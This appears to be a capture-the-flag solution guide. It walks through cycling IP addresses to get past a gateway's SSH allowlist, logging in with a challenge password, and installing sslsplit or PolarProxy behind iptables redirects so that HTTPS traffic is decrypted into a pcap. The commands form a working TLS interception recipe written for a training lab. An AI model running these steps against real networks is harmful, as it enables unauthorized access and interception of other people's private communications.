# Interplanetary Internet Interception

_Solution Guide_

## Overview

This challenge asks the competitor to figure out which IP address to set their system to (and then set it), and then use one of two provided tools to intercept and decrypt TLS traffic.

## Question 1

_What is the only IP address that the default gateway (router) will accept SSH connections from on your subnet?_

First we'll need to find the bypass address mentioned in the challenge guide using a shell script.

On the Kali system, run the following command to find the IP address that can reach the router/default gateway on TCP/22.

   ```
   for i in `seq 2 254`; do sudo ip addr flush dev eth0 && sudo ip addr add 172.17.6.$i/24 dev eth0 && echo 'Trying 172.17.6.'$i && nc 172.17.6.1 22 & sleep 1; done
   ```

When a string is returned that indicates the Ubuntu system's SSH banner, the IP address above the banner is the correct IP address.

## Question 2

_What is the ID of the correct mission name in the HTTPS traffic?_

This solution breaks the problem into multiple smaller steps. First we need to actually capture the mission traffic. Then we have a choice of tools to decrypt it. Finally, we'll actually examine the traffic and find the correct mission from the packet data.

### Intercepting the traffic

1. Append the following to the /etc/network/interfaces file, except replace 77 with the IP address discovered in the previous step.

   ```
   auto eth0
   iface eth0 inet static
   address 172.17.6.77/24
   gateway 172.17.6.1
   ```

2. Flush eth0 and restart the networking service to apply the new IP address (172.17.6.77 in the previous step).

   ```
   sudo ip addr flush dev eth0 && sudo systemctl restart networking
   ```

3. Verify your IP address is correctly set.

   ```
   ip a
   ```

4. SSH with the credentials in the challenge guide (user:SecureThisShip!) to the router/default gateway to verify you can establish this connection before transferring your TLS interception tool of choice.

   ```
   ssh user@172.17.6.1
   ```

5. On Kali, click the 'iso' icon to see your choice of TLS interception tools (PolarProxy and/or sslsplit). Verify the absolute filepath of these files. Open a second terminal tab or window (on your Kali) and SCP either PolarProxy or sslsplit to the router/default gateway. Either tool can be used for this challenge, and only one of the following two sections need to be followed.

   ```
   scp /media/cdrom0/sslsplit_deps.tar.gz user@172.17.6.1:~/
   ```
   **or**
   ```
   scp /media/cdrom0/PolarProxy_0-9-0_linux-x64.tar.gz user@172.17.6.1:~/
   ```

### (Choice 1) sslsplit

1. Navigate back to your first terminal window where you are SSH'd into the router/default gateway. Verify sslsplit_deps.tar.gz is now on the router/default gateway user's home directory.

   ```
   cd ~ && ls
   ```

2. Extract the sslsplit_deps.tar.gz file.

   ```
   tar xf sslsplit_deps.tar.gz
   ```

3. Install sslsplit and dependencies that were extracted.

   ```
   for i in *.deb; do sudo dpkg -i $i; done
   ```

4. Generate the RSA private key.

   ```
   openssl genrsa -out ca.key 4096
   ```

5. Generate a new X.509 certificate. Fill in the fields as you'd like.

   ```
   openssl req -new -x509 -days 365 -key ca.key -out ca.crt
   ```

6. Create two iptables rules to send 80 & 443 traffic to sslsplit. Technically, only 443 traffic is required for this challenge.

   ```
   sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
   sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
   ```

7. Run sslsplit and write the decrypted traffic to a pcap file.

   ```
   sslsplit -D -l conn.log -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 -X decrypted.pcap
   ```

### (Choice 2) PolarProxy

1. Navigate back to your first terminal window where you are SSH'd into the router/default gateway. Verify PolarProxy_0-9-0_linux-x64.tar.gz is now on the router/default gateway user's home directory.

   ```
   cd ~ && ls
   ```

2. Extract the PolarProxy_0-9-0_linux-x64.tar.gz file.

   ```
   tar xf PolarProxy_0-9-0_linux-x64.tar.gz
   ```

3. Create two iptables rules to send the traffic to PolarProxy.

   ```
   sudo iptables -I INPUT -i ens32 -p tcp --dport 10443 -m state --state NEW -j ACCEPT
   sudo iptables -t nat -A PREROUTING -i ens32 -p tcp --dport 443 -j REDIRECT --to 10443
   ```

4. Run polarproxy and write the decrypted traffic to a pcap file.

   ```
   ./PolarProxy -v -p 10443,80,443 --insecure -w decrypted.pcap
   ```

### Analyze the decrypted.pcap file

1. Open a new terminal and scp the file from the default gateway/router to your Kali's home directory.

   ```
   scp user@172.17.6.1:~/decrypted.pcap ~/
   ```

2. Import the decrypted.pcap file into Kali's Wireshark.

   ```
   wireshark -r ~/decrypted.pcap
   ```

3. You should see all HTTPS traffic now decrypted as HTTP.

4. There are 120 Mission IDs that are queried per ~minute (1 every .5 seconds). Either sift through this pcap to find the correct mission ID, or you can click the magnifying glass, select 'String', select 'Packet bytes', search for ' correct', and click 'Find'. Notice the intentional space before correct as this will ignore all strings that state incorrect. At the bottom (packet bytes panel), you should now see the correct MissionName and MissionID received.
